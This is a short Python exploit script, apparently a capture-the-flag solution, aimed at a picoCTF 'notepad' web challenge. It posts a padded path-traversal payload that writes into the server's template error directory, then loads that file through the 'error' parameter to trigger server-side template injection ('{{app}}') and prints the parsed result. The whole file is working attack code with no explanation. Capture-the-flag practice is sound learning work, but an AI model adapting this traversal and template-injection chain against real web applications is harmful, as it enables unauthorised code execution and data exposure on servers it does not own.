import requests
import urllib.parse as urp
import html as HTML

URL = "https://notepad.mars.picoctf.net"


class Exploit:
    def __init__(self, url=URL, content=None):
        self.session = requests.Session()
        self.url = url
        self.content = content

    def lfi_requests(self):
        url = self.url+"/new"
        data = {"content": self.make_payload()}
        return self.session.post(url, data=data)

    def make_payload(self):
        payload = "..\\templates\\errors\\"
        payload = payload+"a"*(128-len(payload))+self.content
        return payload

    def parser_html(self, html):
        html = html[294:]
        html = html[:-132]
        return HTML.unescape(html)

    def get_payload_homepage(self, error):
        return self.session.get(self.url+"/?error="+error).text

    def start(self):
        error_url = self.lfi_requests().url
        error_url = urp.urlparse(error_url).path[18:-5]

        get_payload = self.get_payload_homepage(error=error_url)

        parse_payload = self.parser_html(get_payload)

        return parse_payload


payload = """{{app}}"""
x = Exploit(content=payload).start()

print(x)
